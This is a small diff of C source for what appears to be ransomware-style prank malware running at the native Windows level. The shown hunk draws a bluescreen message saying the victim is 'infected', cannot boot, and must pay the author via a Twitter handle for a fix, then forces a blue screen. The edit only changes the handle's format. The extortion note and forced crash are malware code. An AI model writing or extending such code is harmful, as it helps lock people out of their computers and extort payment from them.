@@ -21,7 +21,7 @@ void NtEntry(){
     RtlDrawTextOnBluescreenScreen(L"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
     RtlDrawTextOnBluescreenScreen(L"YOU HAVE BEEN INFECTED BY [insert random creative name]\n\n");
     RtlDrawTextOnBluescreenScreen(L"If you got this, well idk what you want me to do, but uh you can't boot to your machine anymore\n");
-    RtlDrawTextOnBluescreenScreen(L"Idk message me in twitter (zvqlfied) and pay me a buck and ill give you the way to fix your PC\n\n");
+    RtlDrawTextOnBluescreenScreen(L"Idk message me in twitter (@zvqlfied) and pay me a buck and ill give you the way to fix your PC\n\n");
     RtlSleep(30000);
     RtlStartBlueScreen();
 
